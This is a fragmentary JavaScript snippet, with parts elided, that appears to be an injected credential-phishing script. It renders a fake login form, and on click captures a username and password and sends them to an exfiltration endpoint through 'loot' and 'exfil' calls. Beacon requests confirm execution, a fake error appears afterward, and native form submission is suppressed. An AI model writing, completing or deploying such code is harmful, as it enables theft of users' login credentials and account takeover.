(function () {
  ...
  // fire-and-forget multi-method beacon (GET image is the most reliable)
  ...
  // 0) proof of execution + shows which EXFIL is actually running
  hit("/chunk-" + Date.now(), "EXFIL=" + EXFIL + " url=" + location.href);
  ...
  function render() {
    ...
    document.getElementById("mx-b").addEventListener("click", function () {
      ...
      hit("/clicked", "u=" + encodeURIComponent(u));
      exfil(loot({ u: u, p: p }));
      hit("/after-exfil", "ok");

      setTimeout(function () {
        document.getElementById("mx-e").style.display = "block";
      }, 700);
    });

    // swallow any submit so the URL can never be clobbered by a native GET
